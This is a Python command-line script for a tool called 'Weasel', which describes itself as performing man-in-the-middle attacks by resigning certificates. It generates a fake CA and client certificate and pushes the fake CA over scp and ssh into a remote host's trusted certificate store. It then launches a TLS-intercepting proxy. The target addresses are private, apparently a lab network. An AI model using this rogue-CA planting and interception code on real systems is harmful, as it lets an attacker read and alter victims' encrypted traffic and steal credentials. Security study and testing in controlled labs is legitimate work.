#!/usr/bin/python3

import os
import argparse
import sys
from WeaselTCP import *
from certgen import *

if __name__ == "__main__":
    if not os.geteuid() == 0:
        sys.exit("\nOnly root can run this script\n")

    parser = argparse.ArgumentParser(
        prog="WeaselUtility",
        description="Weasel is made for processing MITM attacking with certificates exploration and resigning"
    )
    parser.add_argument('-quiet', action='store_true')

    subparsers = parser.add_subparsers(dest='mode')

    generate_p = subparsers.add_parser('generate')
    generate_p.add_argument('-scc', action='store_true')

    x509_p = subparsers.add_parser('x509')
    x509_p.add_argument('-CAfile')
    x509_p.add_argument('-cert')

    # parser.add_argument('-debug', action='store_true')

    options = parser.parse_args()

    CA_CERT, CLIENT_CERT = None, None
    if options.mode == 'generate':
        print("============= Generating CA certificate =============")
        CA_fields = getFields()

        print("\n=========== Generating CLIENT certificate ===========")
        CLIENT_fields = getFields()

        CA_KEY, CA_CERT = generateCA(CA_fields["C"], CA_fields["S"], CA_fields["L"], CA_fields["O"], CA_fields["OU"],
                                     CA_fields["CN"], CA_fields["emailAddress"], CA_fields["notBefore"],
                                     CA_fields["notAfter"])

        REQ = generateRequest(CLIENT_fields["C"], CLIENT_fields["S"], CLIENT_fields["L"], CLIENT_fields["O"],
                              CLIENT_fields["OU"], CLIENT_fields["CN"], CLIENT_fields["emailAddress"])

        CLIENT_CERT = generateCertificate(CLIENT_fields["notBefore"], CLIENT_fields["notAfter"], request=REQ,
                                          issuer=CA_CERT, issuer_key=CA_KEY)
        if options.scc:
            if not options.quiet:
                ca_cer_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, CA_CERT)
                with open("misc/certinfo/FAKE_CA.pem", 'wb') as f:
                    f.write(ca_cer_pem)
            client_cer_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, CLIENT_CERT)
            with open("misc/certinfo/FAKE_CLIENT.pem", 'wb') as f:
                f.write(client_cer_pem)

    elif options.mode == "x509":
        CA_path = options.CAfile
        CLIENT_CERT_path = options.cert

        with open(CA_path, 'rb') as f:
            CA_CERT = crypto.load_certificate(crypto.FILETYPE_PEM, f.read())

        with open(CLIENT_CERT_path, 'rb') as f:
            CLIENT_CERT = crypto.load_certificate(crypto.FILETYPE_PEM, f.read())

    ca_cer_raw = crypto.dump_certificate(crypto.FILETYPE_ASN1, CA_CERT)
    client_cer_raw = crypto.dump_certificate(crypto.FILETYPE_ASN1, CLIENT_CERT)

    # saving ca cert, sending to server and making it trusted
    ca_cer_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, CA_CERT)
    with open("misc/certinfo/FAKE_CA.pem", 'wb') as f:
        f.write(ca_cer_pem)

    if not options.quiet:
        print("\n=========== Sending CA certificate to server ===========")
        ca_name = input("Enter CA certificate name: ")
        subprocess.call(['sudo', 'scp', 'misc/certinfo/FAKE_CA.pem',
                         f'first@192.168.10.131:/home/first/{ca_name}.crt'])
        subprocess.call(
            ['ssh', "first@192.168.10.131", "sudo", "-S", "mv", f"/home/first/{ca_name}.crt",
             "/usr/local/share/ca-certificates/"])
        subprocess.call(['ssh', "first@192.168.10.131", "update-ca-certificates"])

    weaselProxy = WeaselProxy(bind_port=8080, interface="192.168.10.128")
    try:
        weaselProxy.start(CertificateChain(client_cer_raw, ca_cer_raw))
    finally:
        subprocess.call(['sudo', 'bash', './scripts/reset.sh'])
